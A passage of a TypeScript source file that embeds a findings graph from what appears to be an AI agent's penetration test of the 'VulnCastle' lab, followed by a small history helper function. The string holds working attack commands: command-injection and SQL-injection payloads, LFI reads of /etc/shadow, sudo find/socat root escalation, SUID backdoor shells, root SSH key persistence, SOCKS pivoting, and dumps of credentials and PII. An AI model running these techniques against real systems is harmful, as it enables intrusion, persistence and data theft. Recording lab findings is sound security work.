vpnuser/•••; From devops: db-01 root/•••; From hr: default •••). curl .../debug -> env with SECRET_KEY/SMTP creds. Login POST /login validates a hardcoded creds dict; no SQLi/SSTI/LFI handler reached. Endpoints 404: /mail /api /admin /register /send /compose /password /reset /users /static. Evidence: graph/data/step-mail01-*.html/.txt, graph/facts/fact_mail01_unauth_inbox.md, fact_mail01_root_via_devuser.md.\n\nData references: graph/facts/fact_mail01_unauth_inbox.md, graph/data/step-mail01-debug.txt\n\n### Own web-01 (172.20.1.10) fully: from www-data RCE/LFI, enumerate app source, config and DB creds, harvest credentials, achieve local privesc to root, and use web-01 as a secondary pivot. Write result file and evidence.\n\nStep: step:exploit-web-01 · done\n\nReason: web-01 root compromise verified live (sudo find -> uid=0), multiple independent vectors and root persistence recorded. DMZ web-01 objective met.\n\n#### From web-01: hardcoded DB creds app_user / ••• found in /var/www/html/notes/welcome.txt (Host db-01.internal) and leaked via LFI; SSH password reuse backup/••• (uid 34, /bin/bash) and sysadmin/••• (uid 1000) on web-01. /etc/shadow hashes harvested for backup/sysadmin/••• (sysadmin+backup recovered, devuser/deploy cracking pending).\n\nFact: fact:web01-creds\n\nVerified LFI: GET http://172.17.0.1:8080/?page=notes&file=/var/www/html/notes/welcome.txt -> 'Host: db-01.internal / User: app_user / Pass: •••'. backup/••• SSH -> uid=34(backup) on web-01. Evidence: graph/data/web01-shadow-users.txt, step-web01-harvest.txt.\n\nData references: graph/data/web01-shadow-users.txt, graph/data/step-web01-harvest.txt\n\n#### web-01 (172.20.1.10) fully compromised to root. Vectors: (1) OS command injection POST ?page=ping host=127.0.0.1;id -> www-data (PHP shell_exec on host param); (2) LFI ?page=notes&file=; (3) unrestricted file upload into /var/www/html/uploads (dir 0777, nginx autoindex) -> webshell; (4) SSH password reuse sysadmin/••• (uid 1000); (5) local privesc: sudoers grants 'sysadmin ALL=(ALL) NOPASSWD: /usr/bin/find' -> root via find -exec /bin/bash; (6) alternate: world-writable /opt/backup.sh run by root cron */5. Root verified live (uid=0 on web-01). Root SSH key persistence in /root/.ssh/authorized_keys.\n\nFact: fact:web01-privesc\n\nVerified: sshpass -p ••• proxychains4 ssh sysadmin@172.20.1.10 'sudo -n /usr/bin/find / -maxdepth 0 -exec /bin/bash -c \"id; hostname\"' -> uid=0(root) web-01. Src: shell_exec(\"ping -c 3 \".$host) in index.php. Upload uses move_uploaded_file into /var/www/html/uploads (0777). Root key: graph/data/web01_root_key. SUID root bash /tmp/.rb (4755). Evidence: graph/data/step-web01-final.txt, step-web01-{shell,files,privesc,root,root2}.txt, fact_web01.md.\n\nData references: graph/data/step-web01-final.txt, graph/data/web01_root_key, graph/facts/fact_web01.md\n\n## Compromise internal network hosts\n\nGoal: goal:compromise-internal · done\n\nSuccess criteria: Each reachable internal host (app-01 10.10.0.13, db-01 10.10.0.14, file-01 10.10.0.15, admin-01 10.10.0.16) is enumerated, its vulnerabilities exploited, additional credentials/access obtained, and privilege escalation demonstrated where possible, with evidence.\n\nParent Goal: goal:penetrate-vulncastle\n\nSuccess criteria met for all four internal hosts: app-01 rooted via unauthenticated command injection (uid=0 live) with LFI/SSRF and durable root SSH; db-01 DB-root-equivalent (ALL PRIVILEGES) with root password recovered, PII and cross-host service credentials dumped (host OS access n/a: SSH closed, mysqld uid 999, UDF blocked - recorded negative); file-01 Samba public/confidential data and MSSH credential reuse with four SSH footholds (no local root - recorded negative); admin-01 rooted via world-writable root cron (euid=0 live) and Admin Panel SQLi auth bypass. All compromise paths have evidence files.\n\nSupporting Facts: fact:app01-root-rce, fact:app01-api-vulns, fact:db01-root-equivalent, fact:db01-service-accounts, fact:db01-smbadmin-correction, fact:file01-cred-reuse-loot, fact:file01-samba-vuln, fact:admin01-root, fact:admin01-panel, fact:admin01-redis\n\n### Exploit admin-01 (10.10.0.16): test unauthenticated Redis on 6379 for RCE/credential theft, and attack the Admin Panel on 8080 (/login) with the leaked service api_key and any harvested creds. Goal: admin/root access on admin-01.\n\nStep: step:exploit-admin-01 · done\n\nReason: admin-01 exploited to root (world-writable root cron -> SUID root bash + root SSH key, verified euid=0 live). Unauthenticated Redis (CONFIG write as root) and Admin Panel SQLi auth bypass verified. Redis-RDB RCE and flag files recorded as honest negatives.\n\n#### admin-01 Admin Panel (:8080, Python BaseHTTP) has SQL injection in /login password field (query concatenation of username/password, UNION n=4), giving auth bypass: POST /login with username=administrator&password=x' OR '1'='1 -> 302 Location: /dashboard. GET /dashboard is also reachable unauthenticated (broken auth, no session validation). Panel creds recovered from /opt/admin/app.py and admin.db: administrator / ••• (superadmin), operator / •••. Verified live.\n\nFact: fact:admin01-panel\n\nExact: curl -x socks5h://127.0.0.1:1080 -i -X POST -d \"username=administrator&password=x' OR '1'='1\" http://10.10.0.16:8080/login -> HTTP/1.0 302 Found, Location: /dashboard. Unauth GET /dashboard -> 200. Evidence: graph/data/step-admin01-*.txt, graph/facts/fact_001-admin01.md.\n\nData references: graph/data/step-admin01-REDIS.txt, graph/data/step-admin01-privesc-harvest.txt\n\n#### admin-01 Redis 6379 is unauthenticated (PING -> +PONG, protected-mode no) and runs as root; CONFIG SET dir /root and /etc returned +OK and SAVE +OK (arbitrary write as root). However Redis RDB-based RCE was NOT achieved: Redis 6.0.16 blocks dbfilename path traversal and cron.d RDB files were not parsed. Keyspace was empty. Verified live (PING, CONFIG GET protected-mode -> no).\n\nFact: fact:admin01-redis\n\nCorrected by: fact:admin01-redis-ref-correction\n\nData references: graph/data/step-admin01-REDIS.txt\n\n#### CORRECTION to fact:admin01-redis (reference only): the evidence file is graph/data/step-admin01-redis.txt (lowercase), not step-admin01-REDIS.txt. The claims in fact:admin01-redis (unauthenticated Redis 6379, protected-mode no, root process, CONFIG SET dir + SAVE succeed; dbfilename traversal blocked, cron.d RDB not parsed) remain valid and were re-verified live.\n\nFact: fact:admin01-redis-ref-correction\n\nCorrects: fact:admin01-redis\n\nData references: graph/data/step-admin01-redis.txt, graph/data/step-admin01-panel-sqli.txt\n\n#### admin-01 (10.10.0.16) rooted. Foothold: SSH sysadmin/••• (uid 1000). Privesc: /opt/healthcheck.sh is world-writable (0777, root:root) and executed by root cron every 60s; overwriting it installed an authorized root SSH key and a SUID bash /tmp/rootshell. Root verified live: /tmp/rootshell -p -c id -> uid=1000(sysadmin) euid=0(root); root key in /root/.ssh/authorized_keys. No flag file found on admin-01 (honest negative).\n\nFact: fact:admin01-root\n\nEvidence: graph/data/step-admin01-privesc-harvest.txt, step-admin01-root-harvest.txt, step-admin01-shell*.txt, graph/facts/fact_001-admin01.md.\n\nData references: graph/data/step-admin01-privesc-harvest.txt, graph/data/step-admin01-root-harvest.txt\n\n### Exploit app-01 (10.10.0.13:3000) Node API: leverage /api/users api_key, LFI/path traversal via /api/files?name=, SSRF via /api/fetch?url=, and command execution/diagnostics; obtain shell/creds and read app config.\n\nStep: step:exploit-app-01 · done\n\nReason: app-01 fully compromised: unauthenticated root command injection at POST /api/diagnostics (verified uid=0 live), durable root SSH persistence verified, LFI/SSRF/IDOR and leaked api_key recovered. Negative result recorded: no flag material on app-01.\n\n#### app-01 API additional vulns: (1) path traversal/LFI GET /api/files?name=../../../etc/shadow reads arbitrary files incl. /etc/shadow, /proc/self/environ, /opt/api/server.js; (2) SSRF GET /api/fetch?url= fetches internal URLs (e.g. http://127.0.0.1:3000/api/users), file:// blocked; (3) all endpoints unauthenticated, /api/users exposes PII and service api_key ••• (no API key validation in code).\n\nFact: fact:app01-api-vulns\n\nApp is Node/Express, source /opt/api/server.js, data /opt/api/data. App-01 readme confirms Redis admin-01:6379 has no auth and Samba file-01 has guest enabled. App-01 is root-owned however no flag material found on app-01 (checked /opt /root /home /var /tmp /etc for flag patterns; no SSH private keys on host). Evidence: graph/data/step-app01-lfi.txt, step-app01-ssrf.txt, step-app01-files.txt, step-app01-flags.txt, step-app01-recon.txt.\n\nData references: graph/data/step-app01-lfi.txt, graph/data/step-app01-ssrf.txt, graph/data/step-app01-flags.txt\n\n#### app-01 (10.10.0.13) Node API has unauthenticated root command injection at POST /api/diagnostics. server.js runs execSync('nslookup ${target}') unsanitized. {\"target\":\"127.0.0.1|id\"} returns uid=0(root). Verified live.\n\nFact: fact:app01-root-rce\n\nExact: curl -s -x socks5h://127.0.0.1:1080 -X POST -H 'Content-Type: application/json' --data '{\"target\":\"127.0.0.1|id\"}' http://10.10.0.13:3000/api/diagnostics -> {\"result\":\"uid=0(root) gid=0(root) groups=0(root)\"}. Endpoint is POST-only (GET 404, OPTIONS Allow: POST); pipe '|' and ';' both work. Evidence: graph/data/step-app01-rce*.txt, graph/data/step-app01-diag*.txt.\n\nData references: graph/data/step-app01-rce.txt, graph/data/step-app01-diag.txt\n\n#### Durable root access on app-01: an SSH private key was written to /root/.ssh/authorized_keys via the /api/diagnostics RCE, and root SSH login via the pivot works (uid=0). Key material: /task/workdir/app01_root_key. Verified live.\n\nFact: fact:app01-root-ssh\n\nLogin: proxychains4 -f /task/workdir/proxychains.conf ssh -i /task/workdir/app01_root_key root@10.10.0.13 -> uid=0(root), hostname app-01. Also sysadmin:••• (uid 1000) exists but sudo needs a password. Evidence: graph/data/step-app01-persistence.txt, graph/data/step-app01-rootssh.txt.\n\nData references: graph/data/step-app01-persistence.txt, graph/data/step-app01-rootssh.txt, /task/workdir/app01_root_key\n\n### Exploit db-01 (10.10.0.14:3306 MariaDB): use app_user/••• and/or service api_key to authenticate, enumerate databases/tables, dump credential material (e.g. password hashes, app secrets), and attempt OS-level access via database features if available.\n\nStep: step:exploit-db-01 · done\n\nReason: db-01 DB-layer fully compromised (root-equivalent, root password recovered), PII and cross-host service credentials dumped. Host OS access n/a (SSH closed, mysqld uid 999, UDF blocked) - recorded as negative, not as failure of the DB objective.\n\n#### db-01 host-level OS access NOT achieved (honest negative): TCP/22 is CLOSED on db-01; mysqld runs as uid 999 (mysql), FILE priv + secure_file_priv='' allow LOAD_FILE/OUTFILE arbitrary paths but only /tmp,/var/tmp,/var/lib/mysql,/dev/shm writable (Errcode 13 elsewhere); no pre-installed UDFs and plugin_dir is read-only (/usr/lib/mysql/plugin unwritable) so UDF RCE blocked; no flag/secret tables, no flag file. Compromise is DB-layer (root-equivalent) only.\n\nFact: fact:db01-host-negative\n\nData references: graph/data/step-db01-osaccess.txt, graph/data/step-db01-logs.txt\n\n#### db-01 (10.10.0.14) MariaDB 10.11.19: app_user / ••• authenticates over the network and has GRANT ALL PRIVILEGES ON *.* (DB-root equivalent). mysql.user shows root@localhost, root@%, app_user@% sharing the same SHA1(SHA1) hash ••• == •••; login as root/••• returns root@%. Verified live (reused forward 127.0.0.1:13306).\n\nFact: fact:db01-root-equivalent\n\nData references: graph/data/step-db01-enum.txt, graph/data/step-db01-authmatrix.txt, graph/facts/fact_db01.md\n\n#### db-01 acme_corp.service_accounts dump (cross-host credential harvest, verified live): smbadmin / ••• -> file-01 Samba (read/write all shares); Redis at admin-01.internal:6379 requires NO auth; backup/••• -> vpn-gw-01 SSH (verified uid 34); administrator / ••• -> admin-01:8080 Admin Panel. Also acme_corp.customers PII: 5 rows with credit_card and ssn.\n\nFact: fact:db01-service-accounts\n\nVerified via mysql -h127.0.0.1 -P13306 -u root -p'•••' --skip-ssl -e \"SELECT ... FROM acme_corp.service_accounts;\". Full PII in graph/data/step-db01-fullenum.txt. These creds were forwarded to the file-01 and admin-01 execute agents.\n\nCorrected by: fact:db01-smbadmin-correction\n\nData references: graph/data/step-db01-dump.txt, graph/data/step-db01-fullenum.txt\n\n### Exploit file-01 (10.10.0.15) Samba 139/445: enumerate shares (incl. null/guest and service api_key creds), retrieve and write files, harvest credentials/config, and attempt access to the host via Samba features or harvested SSH creds.\n\nStep: step:exploit-file-01 · done\n\nReason: file-01 exploited: null/guest SMB enumeration, confidential share read via sysadmin/•••, harvested MSSH creds, four SSH footholds on file-01. Root not achieved (recorded as negative). Also corrected the disproved smbadmin access claim from fact:db01-service-accounts.\n\n#### CORRECTION to fact:db01-service-accounts: the dumped row 'Samba FileShare smbadmin / •••' does NOT grant Samba access. Live verification on file-01: smbclient //10.10.0.15/confidential -U 'smbadmin%•••' -> NT_STATUS_ACCESS_DENIED (Bad User maps to guest, so smbadmin gets no share). The password ••• is instead valid for the local SMB/SSH user sysadmin on file-01. The rest of fact:db01-service-accounts stays valid: Redis no-auth at admin-01:6379, backup/••• on vpn-gw-01, administrator/••• on admin-01:8080, and the PII dump.\n\nFact: fact:db01-smbadmin-correction\n\nWhat was false: the interpretation that smbadmin/••• provides read/write on file-01 shares. What remains valid: the table was dumped correctly (row text noted 'Read/write access to all shares', which is not what actually happens); the credential reuse path is sysadmin/••• Evidence: graph/data/step-file01-smbadmin.txt, step-file01-confidential.txt.\n\nCorrects: fact:db01-service-accounts\n\nData references: graph/data/step-file01-smbadmin.txt, graph/data/step-file01-confidential.txt\n\n#### file-01 credential reuse + loot: sysadmin%••• authenticates to the confidential SMB share (read-only) and reveals passwords.txt, id_rsa_deploy, budget_q4.txt. Harvested MSSH creds: sysadmin:•••, devuser:•••, backup/•••, deploy/•••. All four SSH accounts land on file-01:22 (uids 1000, 1001, 34, 1002); id_rsa_deploy is a fake placeholder. Verified live.\n\nFact: fact:file01-cred-reuse-loot\n\nsshpass -p <pw> proxychains4 ssh <user>@10.10.0.15 -> uid=1000/1001/34/1002 hostname file-01. SMB list: public, confidential, backups; confidential contains passwords.txt (67B), id_rsa_deploy (98B fake), budget_q4.txt (57B), retrieved under graph/data/step-file01-retrieved/. Evidence: graph/data/step-file01-confidential-contents.txt, step-file01-sysadmin-smb.txt, step-file01-ssh.txt, step-file01-loot.txt.\n\nData references: graph/data/step-file01-retrieved/, graph/data/step-file01-confidential-contents.txt, graph/data/step-file01-loot.txt\n\n#### file-01 local privilege escalation NOT achieved (honest negative): none of the landed users (sysadmin, backup, devuser, deploy) has sudo, no unusual SUID/CAP files, no custom root cron/systemd jobs, no world-writable root files; /etc/shadow, /root and samba logs are denied. Kernel 6.8.0-107 not pursued. file-01 objective result = SSH host access + confidential data via credential reuse, no root.\n\nFact: fact:file01-host-negative\n\nData references: graph/data/step-file01-privesc.txt, graph/data/step-file01-host-enum.txt\n\n#### file-01 (10.10.0.15) Samba 4.15.13-Ubuntu (SMB1 min protocol NT1). Null/guest session lists 4 shares: public, confidential, backups, IPC$. public is world-writable (0777) for null/guest; backups is read-only and empty for null; confidential is NT_STATUS_ACCESS_DENIED for null/guest/smbadmin.\n\nFact: fact:file01-samba-vuln\n\nsmbclient -L //10.10.0.15 -N -> public/confidential/backups/IPC$, comment 'ACME File Server', Workgroup ACMECORP. smb.conf: no force user, wide links=No, SMB1 enabled. Evidence: graph/data/step-file01-enum.txt, step-file01-samba-config.txt, step-file01-shares-direct.txt.\n\nData references: graph/data/step-file01-enum.txt, graph/data/step-file01-samba-config.txt\n\n## Penetrate VulnCastle lab and record findings\n\nGoal: goal:penetrate-vulncastle · done\n\nSuccess criteria: Entry points (web 8080, webmail 8025, ssh 2222) enumerated and exploited, pivot into DMZ 172.20.1.0/24 and internal 10.10.0.0/24 achieved, privilege escalation performed on lab hosts, and all findings recorded with evidence.\n\nSuccess criteria met: entry points 8080/8025/2222 were enumerated and exploited (web-01 and mail-01 rooted; SSH gateway landed on the dual-homed pivot), pivoting into DMZ 172.20.1.0/24 and internal 10.10.0.0/24 was achieved through vpn-gw-01 with a verified host/service map, privilege escalation was performed (root on web-01, mail-01, app-01, admin-01, vpn-gw-01; db-root on db-01), and all findings were recorded with evidence in graph/data/FINDINGS.md and the accepted Facts.\n\nSupporting Facts: fact:pivot-network-map, fact:web01-rce, fact:app01-api-leak, fact:final-report\n\n### Produce the final penetration-test report fact for the main goal, citing the entry-point exploitation, pivot, network map, and privilege escalations.\n\nStep: step:final-report · done\n\nReason: Final report fact recorded.\n\n#### VulnCastle lab fully penetrated. Entry points all exploited: ACME portal http://172.17.0.1:8080 (web-01, cmd injection/LFI/upload → root), ACME Webmail http://172.17.0.1:8025 (mail-01, unauth /inbox + /debug + sudo python3 → root), and SSH gateway 172.17.0.1:2222 (vpn-gw-01, sysadmin/••• + sudo socat → root). Pivot into DMZ 172.20.1.0/24 and internal 10.10.0.0/24 achieved via dual-homed vpn-gw-01 (SOCKS5). Internal hosts: app-01 rooted (command injection), admin-01 rooted (root cron/writable healthcheck + panel SQLi), db-01 database root-equivalent with root password and PII/credential dump, file-01 Samba data loot and MSSH credential reuse. Root achieved on web-01, mail-01, app-01, admin-01 and vpn-gw-01. All findings recorded in graph/data/FINDINGS.md and as Facts; raw evidence in 86 graph/data files.\n\nFact: fact:final-report\n\nData references: graph/data/FINDINGS.md, graph/tmux-registry.md, graph/data/naabu-dmz.txt, graph/data/naabu-internal.txt\n\n### Establish the pivot: SSH sysadmin@172.17.0.1:2222 -> vpn-gw-01, escalate to root via NOPASSWD sudo socat, set up a dynamic SSH SOCKS5 forward from sandbox, and enumerate routes/DMZ+internal reachability from vpn-gw-01.\n\nStep: step:pivot-establish · done\n\nReason: SOCKS pivot verified (curl through 127.0.0.1:1080 reached internal web/API services 200). Root on vpn-gw-01 verified (uid=0). DMZ and internal host/port maps collected with naabu. Pivot goal success criteria met.\n\n#### app-01 Node API (http://10.10.0.13:3000) leaks data unauthenticated: /api/users returns PII incl. SSN/salary and a service account api_key '•••' with note 'Has access to db-01 and file-01'; /api/health lists internal services db-01.internal:3306, file-01.internal:445, admin-01.internal:6379 (Redis). API also exposes /api/fetch?url= (SSRF), /api/diagnostics, /api/files?name= (path traversal).\n\nFact: fact:app01-api-leak\n\nData references: graph/data/, graph/data/naabu-internal.txt\n\n#### Pivot established: SSH dynamic SOCKS5 on sandbox 127.0.0.1:1080 via sysadmin@172.17.0.1:2222 -> vpn-gw-01 (172.20.1.12 / 10.10.0.12). Root on vpn-gw-01 via NOPASSWD `sudo /usr/bin/socat - EXEC:'/bin/bash...'` returns uid=0(root). naabu (nmap broken in sandbox) recovered full DMZ+internal host/port map.\n\nFact: fact:pivot-network-map\n\nDMZ 172.20.1.0/24: .1:22 (gw), .10:22,80 (web-01 ACME portal), .11:22,8025 (mail-01 webmail), .12:22 (vpn-gw-01, dual-homed pivot). Internal 10.10.0.0/24: .1:22 (gw), .12:22 (vpn-gw-01), .13:22,3000 (app-01 Node API), .14:3306 (db-01 MariaDB), .15:22,139,445 (file-01 Samba), .16:22,6379 (admin-01 Redis), .16:8080 (admin-01 Admin Panel). Scans: graph/data/naabu-dmz.txt, graph/data/naabu-internal.txt. SOCKS config: /task/workdir/proxychains.conf (socks5 127.0.0.1 1080). nmap wrapper is broken in sandbox ('exec /usr/lib/nmap/nmap: Operation not permitted') so naabu -s connect with -proxy was used.\n\nData references: graph/data/naabu-dmz.txt, graph/data/naabu-internal.txt\n\n### Preflight and enumerate entry points: probe web 8080, webmail 8025, ssh 2222; record services, versions, and reachable hosts.\n\nStep: step:preflight-recon · done\n\nReason: Entry points 8080/8025/2222 all reachable (200/200/sshd). web-01 OS command injection (?page=ping) and LFI (?page=notes&file=) reproduced live. SSH sysadmin/••• on 172.17.0.1:2222 lands on dual-homed vpn-gw-01 with NOPASSWD sudo socat, reproduced live. Preflight facts remain accurate.\n\n#### SSH sysadmin/••• on 172.17.0.1:2222 lands on vpn-gw-01 (172.20.1.12 DMZ, 10.10.0.12 internal), uid 1000, dual-homed pivot host. sysadmin has NOPASSWD sudo on /usr/bin/socat (privesc).\n\nFact: fact:vpn-gw-01-foothold\n\nData references: graph/data/vpngw-recon.txt\n\n#### Ping page command injection confirmed: POST ?page=ping host=127.0.0.1; id returns uid=33(www-data). Web-01 is 172.20.1.10/24, default route 172.20.1.1.\n\nFact: fact:web01-cmd-injection-detail\n\nData references: graph/data/web01-recon.txt\n\n#### ACME portal on web-01 (172.20.1.10) is vulnerable to OS command injection on ?page=ping (uid=33 www-data) and arbitrary file read via ?page=notes&file= (LFI), leaking /etc/passwd and app_user/••• DB creds.\n\nFact: fact:web01-rce\n\nData references: graph/data/web01-recon.txt\n\n## Establish dual-network pivot\n\nGoal: goal:pivot-internal · done\n\nSuccess criteria: Root or equivalent access on a dual-homed host and a working SOCKS/relay pivot from the sandbox into both DMZ 172.20.1.0/24 and internal 10.10.0.0/24, with a verified host/service map.\n\nParent Goal: goal:penetrate-vulncastle\n\nSuccess criteria met: vpn-gw-01 (dual-homed 172.20.1.12 / 10.10.0.12) is rooted (uid=0 via sysadmin NOPASSWD sudo socat), a SOCKS5 pivot from the sandbox is live and re-verified reaching both DMZ and internal services (HTTP 200), and the full host/service map for 172.20.1.0/24 and 10.10.0.0/24 is recorded.\n\nSupporting Facts: fact:pivot-host-accounts, fact:pivot-verified\n\n### Enumerate local accounts, reuse-candidates and privesc paths on the rooted pivot vpn-gw-01 (entry SSH gateway 172.17.0.1:2222).\n\nStep: step:pivot-host-enum · done\n\nReason: Pivot host local accounts enumerated; no additional privesc needed (root already held via sysadmin sudo socat). Result recorded.\n\n#### Entry SSH gateway 172.17.0.1:2222 forwards to vpn-gw-01 (vpn-gw-01 sshd). Password-reuse accounts that work there: backup/••• (uid 34) and devuser/••• (uid 1001). vpnuser/••• is NOT an SSH account (VPN-only). Neither backup nor devuser has NOPASSWD sudo; root remains available via sysadmin's NOPASSWD /usr/bin/socat.\n\nFact: fact:pivot-host-accounts\n\nVerified: sshpass -p backup ssh -p 2222 backup@172.17.0.1 -> uid=34(backup) vpn-gw-01; ••• -> uid=1001(devuser) vpn-gw-01. 'sudo -n -l' for both = 'a password is required'. vpnuser/••• -> Permission denied over SSH. sysadmin/••• -> uid 1000 with NOPASSWD /usr/bin/socat (root via socat EXEC). backup home dir does not exist on vpn-gw-01.\n\nData references: graph/facts/fact_mail01_unauth_inbox.md, graph/data/step-db01-dump.txt\n\n#### Pivot re-verified live: SOCKS5 on 127.0.0.1:1080 (SSH dynamic forward via sysadmin@172.17.0.1:2222 to vpn-gw-01, dual-homed 172.20.1.12 / 10.10.0.12) returns HTTP 200 for internal app-01 (10.10.0.13:3000) and for DMZ web-01 (172.20.1.10:80), and naabu through it recovered the full DMZ + internal host/port map. Root on vpn-gw-01 confirmed via 'sudo -n /usr/bin/socat - EXEC:/bin/bash ...' returning uid=0. (Host map and scan files detailed in fact:pivot-network-map.)\n\nFact: fact:pivot-verified\n\nHealth probes during the run: curl -x socks5h://127.0.0.1:1080 http://10.10.0.13:3000/api/health -> 200; http://172.20.1.10/ -> 200. SOCKS listener and forwards documented in graph/tmux-registry.md. zone map: DMZ .1,.10,.11,.12; internal .1,.12,.13,.14,.15,.16.\n\nData references: graph/tmux-registry.md, graph/data/naabu-dmz.txt, graph/data/naabu-internal.txt\n\n## Record all findings with evidence\n\nGoal: goal:record-findings · done\n\nSuccess criteria: All vulnerabilities, credentials, pivots, privilege escalations, and host accesses are recorded as Facts with supporting result files under graph/data.\n\nParent Goal: goal:penetrate-vulncastle\n\nSuccess criteria met: graph/data/FINDINGS.md consolidates every vulnerability, recovered credential, pivot, privilege escalation and host access, each backed by raw evidence under graph/data and by accepted Facts.\n\nSupporting Facts: fact:findings-index\n\n### Compile the consolidated findings index (hosts, vulnerabilities, credentials, access, negatives, evidence paths) as a durable deliverable and mark the findings objective complete.\n\nStep: step:findings-index · done\n\nReason: Consolidated findings deliverable compiled and accepted as fact:findings-index; evidence map recorded.\n\n#### Consolidated findings index written to graph/data/FINDINGS.md: 20 vulnerabilities across web-01, mail-01, vpn-gw-01, app-01, db-01, file-01, admin-01 (command injection, LFI, upload, SSRF, IDOR, unauth mailbox/env, sudo/root-cron privesc, DB root-equivalence, Samba share access, unauth Redis with root CONFIG write, panel SQLi auth bypass); credential matrix; access obtained (root on 5 hosts, DB-root, MSSH footholds); honest negatives; evidence map over 86 files under graph/data.\n\nFact: fact:findings-index\n\nDeliverable: graph/data/FINDINGS.md. All claims are backed by graph/data/step-* evidence transcripts and were independently re-verified live where noted. Findings map to accepted Facts: fact:web01-privesc, fact:web01-creds, fact:mail01-webmail-vulns, fact:mail01-root-privesc, fact:app01-root-rce, fact:app01-root-ssh, fact:app01-api-vulns, fact:db01-root-equivalent, fact:db01-service-accounts, fact:file01-samba-vuln, fact:file01-cred-reuse-loot, fact:admin01-root, fact:admin01-panel, fact:admin01-redis, plus host-negative facts and the smbadmin correction.\n\nData references: graph/data/FINDINGS.md, graph/data/web01-shadow-users.txt, graph/data/step-db01-fullenum.txt\n\n"};

export function fgsHistory(key: string): FGSNode[] {
  const node = fgsGraph.nodes.find((n) => n.key === key);
  if (!node) return [];
  if ((node.version ?? 1) <= 1) return [node];
  return [node, { ...node, version: 1, state: "active", summary: node.summary, reason: "Initial accepted version." }];
}